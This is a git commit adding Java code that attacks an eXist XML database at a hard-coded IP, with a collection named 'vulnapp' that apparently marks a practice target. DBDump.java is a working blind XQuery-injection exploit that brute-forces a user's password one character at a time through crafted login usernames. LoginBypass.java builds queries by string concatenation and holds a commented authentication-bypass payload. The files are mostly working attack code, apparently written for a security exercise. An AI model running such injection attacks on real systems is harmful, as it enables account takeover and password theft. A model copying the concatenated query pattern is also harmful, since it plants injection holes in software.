8f8081a684c0c9bdbb6d1612ee16dbda663febdc
sb <19587870+soonloh@users.noreply.github.com>
2018-11-17 16:04:57 +0800

    Completed Login Bypass and Password Dump

---
+++ src/DBDump.java
@@ -0,0 +1,83 @@
+import org.xmldb.api.DatabaseManager;
+import org.xmldb.api.base.Collection;
+import org.xmldb.api.base.Database;
+import org.xmldb.api.base.ResourceIterator;
+import org.xmldb.api.base.ResourceSet;
+import org.xmldb.api.modules.XMLResource;
+import org.xmldb.api.modules.XPathQueryService;
+
+public class DBDump {
+    protected static String DRIVER = "org.exist.xmldb.DatabaseImpl";
+    protected static String URI = "xmldb:exist://13.70.19.195:8080/exist/xmlrpc";
+    protected static String collectionPath = "/db/vulnapp/";
+    protected static String resourceName = "user.xml";
+    public static Collection col = null;
+
+    public static void main(String[] args) throws Exception {
+        Class cl = Class.forName(DRIVER);
+        Database database = (Database) cl.newInstance();
+        DatabaseManager.registerDatabase(database);
+
+        // get the collection
+        col = DatabaseManager.getCollection(URI + collectionPath);
+        try {
+            exploit();
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+    }
+
+    public static void  exploit() throws Exception{
+        //Finding the password length
+        String payload = "mjane\" and string-length(password)=";
+        String append_payload = " or .=\"";
+        int length = 1;
+        while(true){
+            if(!login(payload+length+append_payload,"abc")){
+                length++;
+            }else
+                break;
+        }
+
+        System.out.println("The password length is "+length);
+
+        payload = "mjane\" and substring(password,<i>,1)=\"<char>\"";
+        int startChar = 48;
+        int endChar = 126;
+
+        String found="";
+        for(int i=1; i<=length; i++){
+            String temp_payload = payload.replace("<i>",Integer.toString(i));
+            for(int a=startChar; a<=endChar;a++) {
+                if (login(temp_payload.replace("<char>", Character.toString((char)a)) + append_payload, "abc")) {
+                    found += Character.toString((char)a);
+                    break;
+                }
+            }
+            System.out.println(found);
+        }
+
+    }
+
+    public static boolean login (String username, String password) throws Exception{
+
+        // query a document
+        String xQuery = "doc(\"user.xml\")/userlist/user[uname=\""+username+"\" and password=\""+password+"\"]";
+        //System.out.println("Execute xQuery = " + xQuery);
+
+        XPathQueryService xpqs = (XPathQueryService)col.getService("XPathQueryService", "3.0");
+        xpqs.setProperty("indent", "yes");
+
+        // Execute the query, print the result
+        ResourceSet result = xpqs.query(xQuery);
+        ResourceIterator i = result.getIterator();
+//        while (i.hasMoreResources()) {
+//            Resource r = i.nextResource();
+//            System.out.println((String) r.getContent());
+//        }
+        if (i.hasMoreResources())
+            return true;
+        else
+            return false;
+    }
+}
--- src/LoginBypass.java
+++ src/LoginBypass.java
@@ -9,13 +9,19 @@ import org.xmldb.api.base.ResourceSet;
 import org.xmldb.api.modules.XMLResource;
 import org.xmldb.api.modules.XPathQueryService;
 
-public class App2 {
+public class LoginBypass {
     protected static String DRIVER = "org.exist.xmldb.DatabaseImpl";
     protected static String URI = "xmldb:exist://13.70.19.195:8080/exist/xmlrpc";
     protected static String collectionPath = "/db/vulnapp";
     protected static String resourceName = "user.xml";
 
     public static void main(String[] args) throws Exception {
+
+        //User Input
+        String username = "mjane";
+        //Bypass Login
+        //username = "mjane\" or .=\"";
+        String password = "pass1234";
 
         // initialize database driver
         Class cl = Class.forName(DRIVER);
@@ -26,11 +32,8 @@ public class App2 {
         Collection col = DatabaseManager.getCollection(URI + collectionPath);
 
         // query a document
-        String input1 = "user.xml";
-        String input2 = "mjane\" or \"\"=\"";
-        String xQuery = "doc(\""+input1+"\")/userlist/user[uname=\""+input2+"\"]";
+        String xQuery = "doc(\"user.xml\")/userlist/user[uname=\""+username+"\" and password=\""+password+"\"]";
         System.out.println("Execute xQuery = " + xQuery);
-
 
         XPathQueryService xpqs = (XPathQueryService)col.getService("XPathQueryService", "3.0");
         xpqs.setProperty("indent", "yes");
@@ -38,9 +41,13 @@ public class App2 {
         // Execute the query, print the result
         ResourceSet result = xpqs.query(xQuery);
         ResourceIterator i = result.getIterator();
-        while (i.hasMoreResources()) {
-            Resource r = i.nextResource();
-            System.out.println((String) r.getContent());
-        }
+//        while (i.hasMoreResources()) {
+//            Resource r = i.nextResource();
+//            System.out.println((String) r.getContent());
+//        }
+        if (i.hasMoreResources())
+            System.out.println("Login Successful");
+        else
+            System.out.println("Login Failed");
     }
 }
